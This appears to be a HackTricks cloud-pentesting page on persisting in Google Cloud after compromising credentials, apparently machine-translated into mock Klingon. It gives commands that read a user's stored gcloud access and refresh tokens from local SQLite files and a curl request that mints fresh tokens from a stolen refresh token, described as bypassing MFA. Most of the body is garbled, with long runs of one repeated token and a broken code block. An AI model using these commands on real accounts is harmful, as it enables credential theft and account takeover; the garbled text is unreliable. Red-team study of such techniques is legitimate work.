# GCP - Non-svc Persistance

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

These are useful techniques once, somehow, you have compromised some GCP credentials or machine running in a GCP environment.

## Token Hijacking

### Authenticated User

If you manage to access the home folder of an **authenticated user in GCP**, by **default**, you will be able to **get tokens for that user as long as you want** without needing to authenticated and independently on the machine you use his tokens from and even if the user has MFA configured.

This is because by default you **will be able to use the refresh token as long** as you want to generate new tokens.

To get the **current token** of a user you can run:

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

**ghItlhvam** ghotpu' gcloud **token vItlhutlh**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

**ghItlhvam vItlhutlh** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

**refresh token**, client ID, je client secret jIyajbe'lu'chugh, nIvbogh access token laH run:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

**Admin** > **Security** > **Google Cloud session control**-Da refresh tokens validity vItlhutlh. jatlhpu' 'ej, by default, 16 wovbe' 'e' vItlhutlh 'ej vItlhutlh expire vItlhutlh:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Service Accounts

Authenticated users, DaH jImej, 'ej 'oH 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e'
